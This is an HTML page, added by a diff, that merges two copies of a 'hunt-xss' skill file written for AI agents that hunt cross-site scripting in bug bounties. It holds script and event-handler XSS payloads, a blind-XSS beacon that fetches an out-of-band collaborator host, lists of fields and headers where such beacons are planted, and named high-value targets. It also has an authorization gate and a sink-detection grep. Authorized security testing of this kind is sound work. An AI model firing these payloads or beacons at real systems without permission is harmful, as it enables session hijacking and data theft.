@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-xss</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">xss-hunting</a> / hunt-xss</p><h1>hunt-xss</h1><p class="meta">combined</p><p>The two copies share the same core structure (Crown Jewel Targets and the OOB-Or-It-Didn&#x27;t-Happen Gate are nearly identical), but each contains material steps the other lacks. The uphiago copy provides a framework-specific sink verification table (React/Vue/Angular/Svelte/Next.js) and a grep command to check JS bundles for dangerous rendering patterns, which is a critical &#x27;presence vs. exploitation&#x27; gate. The sickn33 copy provides a mandatory authorization confirmation gate, a unique numeric canary strategy to distinguish real payloads from decoys, and a specific ordered list of injection contexts (inline script, attribute event, URL/href). Crowning one would hide the other&#x27;s unique verification and safety procedures.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-xss/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-xss/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-xss/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-xss/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-xss/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-xss/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-xss
+description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target.
+version: 1.2.0
+license: MIT
+category: security
+risk: offensive
+---
+
+## When to Use
+
+Use when the target has any endpoint where user input is reflected in HTML output, processed by a JavaScript framework, or stored for later display. XSS is the foundational client-side vulnerability class — it enables session hijacking, data theft, phishing, and account takeover. Every form, search field, URL parameter, file upload, and user-controlled field is a candidate. Highest-value targets: admin panels, OAuth sign-in pages, markdown/wiki renderers, email templates, file upload endpoints (SVG/HTML), and help/documentation sites with looser security posture.
+
+## Mandatory Authorization Gate
+
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+1. Ask the user to state the exact target URL, IP, account, or resource.
+2. Ask the user to confirm written authorization and the permitted scope.
+3. Show the exact command(s) and explain their expected effect.
+4. Wait for explicit confirmation in the current conversation.
+
+Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## ⚠️ CRITICAL: Presence ≠ Exploitation
+
+**Reflection of HTML tags does NOT mean XSS is exploitable.** Modern frameworks escape text by default. Before calling a finding XSS, you MUST verify the sink:
+
+| Framework | Default Behavior | XSS Possible Only With |
+|-----------|-----------------|----------------------|
+| React/JSX | Escapes all text | `dangerouslySetInnerHTML`, `innerHTML` on refs |
+| Vue | Escapes `{{ }}` | `v-html` directive |
+| Angular | Escapes `{{ }}` | `[innerHTML]` binding |
+| Svelte | Escapes `{ }` | `{@html}` tag |
+| Next.js RSC | Escapes JSX text | `dangerouslySetInnerHTML` in components |
+| Plain HTML/JS | Does NOT escape | `innerHTML`, `document.write()`, `eval()` |
+
+**XSS verification checklist:**
+1. ✅ Payload is REFLECTED/STORED in response (presence)
+2. ✅ Payload appears in a RENDERABLE context (sink check)
+3. ✅ Payload EXECUTES in browser (proof of exploitation)
+
+If step 1 passes but step 2 fails → **LOW: HTML storage without exploitable sink**. The React ecosystem alone prevents ~90% of apparent XSS because JSX auto-escapes.
+
+**How to Check for Sinks:**
+```bash
+# In JS bundles — search for dangerous rendering patterns
+grep -rEn &#x27;dangerouslySetInnerHTML|innerHTML|outerHTML|v-html|\[innerHTML\]|\{@html\}|insertAdjacentHTML|document\.write\(|eval\(&#x27; /tmp/target_js/
+
+# If NONE appear near the reflected field → NOT exploitable XSS
+# If found → verify the specific field reaches that sink
+```
+
+## Autonomous Testing Priority
+
+**Verify reflection before claiming XSS — encoding is everything.**
+
+Your payload must appear in the response body with angle brackets UNESCAPED. `&lt;script&gt;` is XSS. `&amp;lt;script&amp;gt;` is safe encoding — not vulnerable.
+
+**Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `&lt;script&gt;alert(91234)&lt;/script&gt;` or `&quot;&gt;&lt;img src=x onerror=alert(91234)&gt;`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert(&#x27;XSS&#x27;)` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page&#x27;s decoy examples. Proof = your `alert(&lt;canary&gt;)` shows up in the response with raw, unescaped angle brackets.
+
+**Try these contexts in order:**
+
+1. **Inline script injection** (works when HTML context allows new tags):
+   ```
+   &lt;script&gt;alert(CANARY)&lt;/script&gt;
+   ```
+   Use whatever canary string your proof contract specifies. Confirmed when `&lt;script&gt;alert(CANARY)` appears literally (not HTML-encoded) in the response.
+
+2. **Attribute event injection** (when `&lt;` is filtered but attributes are injectable):
+   ```
+   &quot; onmouseover=&quot;alert(CANARY)
+   &quot; onerror=&quot;alert(CANARY)
+   &quot; onload=&quot;alert(CANARY)
+   ```
+
+3. **URL/href context:**
+   ```
+   javascript:alert(CANARY)
+   ```
+
+**Distinguishing success from failure:**
+- **Vulnerable:** response contains `&lt;script&gt;alert(` unescaped — browser would execute it
+- **Filtered/safe:** response contains `&amp;lt;script&amp;gt;` or `&amp;#x3C;script&amp;#x3E;` — properly encoded
+- **Blocked:** response is an error, or the reflected value is absent entirely
+
+**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.
+
+## Crown Jewel Targets
+
+XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:
+
+- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
+- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
+- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
+- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
+- **Shared SaaS tenant surfaces** (`*.[SHOPIFY_STORE]`, `api.collabs.*`) — XSS in one tenant&#x27;s context can bleed across tenant boundaries
+- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
+- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously
+
+**Asset types that pay most:** Main product domains &gt; Admin subdomains &gt; API endpoints &gt; Marketing/help sites
+
+## OOB-Or-It-Didn&#x27;t-Happen Gate (Blind / Stored XSS)
+
+For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).
+
+### What is NOT confirmation
+
+- ASP.NET request validator rejected your `&lt;` and returned a different status code → not XSS, that&#x27;s WAF noise.
+- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that&#x27;s correct output encoding.
+- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
+- Your `&lt;script&gt;` tag appears in the response as `&amp;lt;script&amp;gt;` → not XSS, that&#x27;s escaping.
+
+### What IS confirmation
+
+- A request to your unique Collaborator subdomain (e.g., `bxss-err-&lt;random&gt;.&lt;collab&gt;.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
+- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
+- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server&#x27;s own backend HTTP client.
+
+### Where to plant blind-XSS beacons
+
+Any field whose value might be viewed in an admin UI / log viewer / email / report later:
+- Error messages (`?ErrorMessage=&lt;svg onload=fetch(&#x27;//bxss-&lt;tag&gt;.&lt;collab&gt;/x&#x27;)&gt;`)
+- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
+- Login form username field (admin may view audit logs of failed logins)
+- User-Agent header (some SOC consoles render UA as HTML)
+- Referer header (some analytics dashboards render Referer as HTML)
+- Email addresses on registration / contact forms
+- File-upload filenames
+
+**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.</pre>
+</body>
+</html>
